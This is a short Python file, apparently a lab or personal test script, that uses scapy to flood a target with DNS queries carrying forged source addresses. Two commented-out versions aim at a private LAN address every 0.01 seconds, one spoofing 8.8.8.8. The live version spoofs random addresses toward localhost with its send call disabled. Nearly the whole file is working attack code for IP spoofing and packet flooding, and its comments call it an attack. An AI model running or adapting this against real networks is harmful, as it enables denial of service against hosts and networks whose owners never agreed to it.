# from scapy.all import *
# import threading
# import time

# # Explicitly provide source IP addresses for the attack
# source_ips = ["8.8.8.8"]  # Modify with your desired source IPs

# # Function to send DNS response packets using the list of IPs repeatedly
# def send_dns_requests():
#     while True:
#         for src_ip in source_ips:
#             target_ip = "192.168.29.88"  # Use the fixed target IP address
#             print("Target ip", target_ip)
#             print(f"Generated IP that is attacking: {src_ip}")  # Print generated IP
#             dns_request = IP(src=src_ip, dst=target_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname="example.com"))
#             send(dns_request, verbose=False)  # Send the packet
#             time.sleep(0.01)  # Adjust the frequency of requests as needed

# # Start sending DNS request packets in a separate thread
# dns_thread = threading.Thread(target=send_dns_requests)
# dns_thread.start()

# # Keep the program running
# while True:
#     time.sleep(1)


# from scapy.all import *
# import threading
# import time

# # Replace "your_laptop_wifi_ip" with your laptop's Wi-Fi adapter IP address
# target_ip = "192.168.29.88"

# # Function to send DNS response packets using the list of IPs repeatedly
# def send_dns_requests():
#     while True:
#         # src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4)))) 
#         src_ip = "192.168.6.1" # Generate random source IP
#         print("Target ip", target_ip)
#         print(f"Generated IP that is attacking: {src_ip}")  # Print generated IP
#         dns_request = IP(src=src_ip, dst=target_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname="example.com"))
#         send(dns_request, verbose=False)  # Send the packet
#         time.sleep(0.01)  # Adjust the frequency of requests as needed

# # Start sending DNS request packets in a separate thread
# dns_thread = threading.Thread(target=send_dns_requests)
# dns_thread.start()

# # Keep the program running
# while True:
#     time.sleep(1)




from scapy.all import *
import threading
import time
import random

# Generate 2 random source IP addresses for the attack
source_ips = [str(RandIP()) for _ in range(2)]

# Function to send DNS response packets using the list of IPs repeatedly
def send_dns_requests():
    while True:
        for src_ip in source_ips:
            target_ip = "127.0.0.1"  # Use the fixed target IP address
            print("Target ip", target_ip)
            print(f"Generated IP that is attacking: {src_ip}")  # Print generated IP
            dns_request = IP(src=src_ip, dst=target_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname="example.com"))
            #send(dns_request, verbose=False) 
            time.sleep(1)  # Adjust the frequency of requests as needed

# Start sending DNS request packets in a separate thread
dns_thread = threading.Thread(target=send_dns_requests)
dns_thread.start()

# Keep the program running
while True:
    time.sleep(1)

